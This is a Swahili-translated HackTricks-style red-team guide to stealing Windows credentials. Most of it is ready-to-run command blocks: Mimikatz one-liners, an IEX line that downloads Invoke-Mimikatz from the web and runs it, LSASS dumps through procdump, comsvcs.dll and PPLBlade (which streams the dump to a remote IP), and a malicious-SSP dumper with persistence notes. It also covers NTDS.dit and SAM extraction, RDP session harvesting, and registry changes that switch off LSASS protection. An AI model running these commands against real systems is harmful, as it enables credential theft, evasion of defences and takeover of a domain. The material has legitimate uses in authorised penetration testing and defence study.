# Kuiba Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya ulinzi unaowezekana wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials na Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **niliyoitengeneza** ili **kutafuta passwords na hashes** ndani ya mwanaathirika.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Kuepukana na AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni chombo halali cha Microsoft**, haigunduliki na Defender.\
Unaweza kutumia zana hii **dump the lsass process**, **download the dump** na **extract** **credentials locally** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Mchakato huu unafanywa moja kwa moja kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe to dump lsass.exe** kama **hatari**, hii ni kwa sababu zinakuwa **zikitambua** mfuatano **"procdump.exe" na "lsass.exe"**. Kwa hivyo ni **kwa usiri zaidi** **kupitisha** kama **hoja** **PID** ya lsass.exe kwa procdump **badala ya** **jina lsass.exe.**

### Dumping lsass kwa **comsvcs.dll**

DLL iitwayo **comsvcs.dll** iliyopo katika `C:\Windows\System32` inahusika na **dumping process memory** wakati wa kuanguka kwa programu. DLL hii ina **function** iitwayo **`MiniDumpW`**, iliyokusudiwa kuitwa kupitia `rundll32.exe`.\
Haina umuhimu kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika sehemu tatu. ID ya mchakato (iliyo kwa ajili ya kudump) ni sehemu ya kwanza, eneo la faili ya dump ndilo sehemu ya pili, na sehemu ya tatu ni kwa ukamilifu neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchambua sehemu hizi tatu, DLL itaunda faili ya dump na kuhamisha kumbukumbu ya mchakato ulioainishwa ndani ya faili hii.\
Kutumia **comsvcs.dll** kunawezekana kwa ajili ya dumping mchakato wa lsass, hivyo kuondoa hitaji la kupakia na kuendesha procdump. Mbinu hii imeelezewa kwa undani kwenye [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kuotomatisha mchakato huu na** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass na Task Manager**

1. Bonyeza kulia kwenye Task Bar kisha bonyeza Task Manager
2. Bonyeza More details
3. Tafuta mchakato "Local Security Authority Process" kwenye tab ya Processes
4. Bonyeza kulia kwenye mchakato "Local Security Authority Process" kisha bonyeza "Create dump file".

### Dumping lsass na procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyotiwa saini na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Kudumpa lsass kwa kutumia PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni chombo cha Protected Process Dumper kinachounga mkono kuficha memory dump na kuhamisha kwenye kompyuta za mbali bila kuiandika kwenye diski.

**Sifa muhimu**:

1. Kupita ulinzi wa PPL
2. Kuficha faili za memory dump ili kuepuka mifumo ya utambuzi ya Defender inayotegemea saini
3. Kupakia memory dump kwa njia za RAW na SMB bila kuiandika kwenye diski (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon inatoa dumper ya hatua tatu iitwayo **LalsDumper** ambayo haiwahi kuita `MiniDumpWriteDump`, hivyo EDR hooks kwenye API hiyo hazifanyi kazi:

1. **Stage 1 loader (`lals.exe`)** – hufafuta `fdp.dll` kwa placeholder inayojumuisha herufi 32 ndogo `d`, inaibadilisha na njia kamili kuelekea `rtu.txt`, inahifadhi DLL iliyorekebishwa kama `nfdp.dll`, na inaita `AddSecurityPackageA("nfdp","fdp")`. Hii inalazimisha **LSASS** kupakia DLL ya uharibifu kama Security Support Provider (SSP) mpya.
2. **Stage 2 inside LSASS** – wakati LSASS inapakia `nfdp.dll`, DLL husoma `rtu.txt`, inafanya XOR ya kila byte na `0x20`, na inaweka blob iliyofichuliwa kwenye kumbukumbu kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyopangwa inatekeleza upya mantiki ya MiniDump kwa kutumia **direct syscalls** zilizoamuliwa kutoka kwa majina ya API yaliyohash (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum iitwayo `Tom` hufungua `%TEMP%\<pid>.ddt`, inastream compressed LSASS dump ndani ya faili, na inafunga handle ili exfiltration iweze kufanyika baadaye.

Operator notes:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` katika kabrasha moja. Stage 1 inaandika upya placeholder iliyohifadhiwa na njia kamili kuelekea `rtu.txt`, hivyo kuzitenganisha kunavunja mnyororo.
* Usajili hufanyika kwa kuongezea `nfdp` kwa `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo wewe mwenyewe ili kuifanya LSASS ipakishe upya SSP kila inapowashwa.
* Faili za `%TEMP%\*.ddt` ni compressed dumps. Zifanyie decompress mahali, kisha uzitumie Mimikatz/Volatility kwa credential extraction.
* Kukimbia `lals.exe` kunahitaji admin/SeTcb rights ili `AddSecurityPackageA` ifanikiwe; mara baada ya wito kurudi, LSASS inapakia kwa uwazi SSP ya mhalifu na kutekeleza Stage 2.
* Kuondoa DLL kutoka diski hakuitoi LSASS. Futa registry entry na restart LSASS (reboot) au uiachie kwa long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit kutoka kwa DC lengwa
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump the NTDS.dit password history kutoka kwa DC inayolengwa
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kuiba SAM & SYSTEM

Faili hizi zinapaswa kuwa **zimewekwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwenye Registry

Njia rahisi ya kuiba faili hizo ni kupata nakala kutoka kwenye registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** ukitumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Kutumia vssadmin

vssadmin binary inapatikana tu kwenye matoleo ya Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya hivyo pia kutoka kwa **Powershell**. Hii ni mfano wa **jinsi ya kunakili faili ya SAM** (diski kuu inayotumika ni "C:" na imehifadhiwa katika C:\users\Public) lakini unaweza kutumia hili kunakili faili yoyote iliyo na ulinzi:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Msimbo kutoka kwa kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Mwishowe, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) ili kufanya nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Uthibitisho za Active Directory - NTDS.dit**

Faili ya **NTDS.dit** inajulikana kama moyo wa **Active Directory**, ikihifadhi data muhimu kuhusu vitu vya watumiaji, vikundi, na uanachama wao. Ndiyo mahali ambapo **password hashes** za watumiaji wa domain zinahifadhiwa. Faili hii ni hifadhidata ya **Extensible Storage Engine (ESE)** na iko katika **_%SystemRoom%/NTDS/ntds.dit_**.

Ndani ya hifadhidata hii, meza tatu kuu zinahifadhiwa:

- **Data Table**: Meza hii inawajibika kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
- **Link Table**: Inafuatilia mahusiano, kama uanachama wa vikundi.
- **SD Table**: **Security descriptors** za kila kitu zinohifadhiwa hapa, zikihakikisha usalama na udhibiti wa ufikiaji kwa vitu vilivyohifadhiwa.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows inatumia _Ntdsa.dll_ kuingiliana na faili hiyo na inatumiwa na _lsass.exe_. Kisha, **sehemu** ya faili ya **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (unaweza kupata data iliyotumika hivi karibuni labda kwa sababu ya kuboresha utendaji kupitia **cache**).

#### Kufungua hashes ndani ya NTDS.dit

Hash imefichwa mara 3:

1. Fungua Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Fungua hash kwa kutumia **PEK** na **RC4**.
3. Fungua hash kwa kutumia **DES**.

**PEK** ina **thamani ile ile** katika **kila domain controller**, lakini imekodishwa ndani ya faili ya **NTDS.dit** kwa kutumia **BOOTKEY** ya **faili SYSTEM ya domain controller (inatofautiana kati ya domain controllers)**. Hivyo ili kupata uthibitisho kutoka faili ya NTDS.dit unahitaji faili NTDS.dit na SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia ujanja wa [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) ujanja).

### **Kutoa hashes kutoka NTDS.dit**

Mara tu unapokuwa **umepata** faili **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ ili **kutoa hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuvitoa kiotomatiki** kwa kutumia domain admin user halali:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **faili kubwa za NTDS.dit** inashauriwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Mwisho, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit hadi kwenye database ya SQLite**

Vitu vya NTDS vinaweza kutolewa hadi kwenye database ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri pekee zinazoondolewa, bali pia vitu vyote na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi mara faili ghafi ya NTDS.dit inapopatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive ni hiari lakini inaruhusu decryption ya siri (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data zifuatazo hutolewa: akaunti za watumiaji na za mashine na hashes zao, UAC flags, timestamp ya last logon na ya password change, descriptions za akaunti, majina, UPN, SPN, vikundi na recursive memberships, mti wa organizational units na uanachama, trusted domains pamoja na aina za trusts, direction na attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwa programu mbalimbali.
```
lazagne.exe all
```
## Vifaa vingine vya kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Chombo hiki kinaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Hutoa credentials kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Toa credentials kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na **itekeleze tu** na nywila zitatolewa.

## Kuchimba vikao vya RDP vinavyotulia na kudhoofisha udhibiti wa usalama

Ink Dragon’s FinalDraft RAT ina tasker ya `DumpRDPHistory` ambao mbinu zake ni muhimu kwa red-teamer yeyote:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – changanua kila user hive kwa `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la server, `UsernameHint`, na last write timestamp. Unaweza kuiga mantiki ya FinalDraft kwa kutumia PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) ili ramani nani alisimamia mashine:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Mara utakapojua ni Domain Admin gani hujiunga mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati kikao chao cha **disconnected** bado kipo. CredSSP + NTLM fallback huacha verifier na tokens zao ndani ya LSASS, ambazo zinaweza kisha kureplayed kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Registry downgrades targeted by FinalDraft

Implant hiyo hiyo pia inaleta mabadiliko kwenye funguo kadhaa za registry ili kufanya wizi wa nywila kuwa rahisi:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Kuweka `DisableRestrictedAdmin=1` kunalazimisha matumizi kamili ya nywila/tiketi tena wakati wa RDP, na kuwezesha pivots za aina ya pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` inaondoa uchujaji wa tokeni wa UAC ili local admins wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` inaruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, ikimpa washambuliaji akaunti nyingine ya ndani yenye vibali vya juu.
* `RunAsPPL=0` inaondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa kumbukumbu kuwa rahisi kwa dumpers kama LalsDumper.

## Marejeo

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
